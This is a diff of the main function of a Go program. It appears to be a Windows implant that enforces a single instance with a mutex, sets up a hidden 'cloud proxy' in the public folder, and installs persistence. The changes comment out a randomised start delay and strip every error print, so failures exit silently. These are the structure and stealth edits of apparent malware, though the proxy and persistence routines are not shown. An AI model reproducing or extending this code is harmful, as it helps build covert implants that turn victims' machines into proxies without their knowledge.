@@ -19,7 +19,7 @@ func main() {
 	time.Sleep(time.Second)
 	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
 	rand.Seed(seed.Int64())
-	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
+	// time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
 	if _, err := CreateMutex("tag"); err != nil {
 		os.Exit(0)
 	}
@@ -27,12 +27,10 @@ func main() {
 	if !CloudProxyExist() {
 		err := os.RemoveAll(os.Getenv("public") + "\\" + tag)
 		if err != nil {
-			fmt.Println(err)
 			os.Exit(0)
 		}
 		err = SetupCloudProxy()
 		if err != nil {
-			fmt.Println(err)
 			os.Exit(0)
 		}
 		errorChan := make(chan error)
@@ -41,7 +39,6 @@ func main() {
 			for {
 				err := <- errChan
 				if err != nil {
-					fmt.Println(err)
 					os.Exit(0)
 				}
 			}
@@ -53,12 +50,10 @@ func main() {
 	var persistence Persistence
 	err := config.Init()
 	if err != nil {
-		fmt.Println(err)
 		os.Exit(0)
 	}
 	err = persistence.Init(config)
 	if err != nil {
-		fmt.Println(err)
 		os.Exit(0)
 	}
 	for {
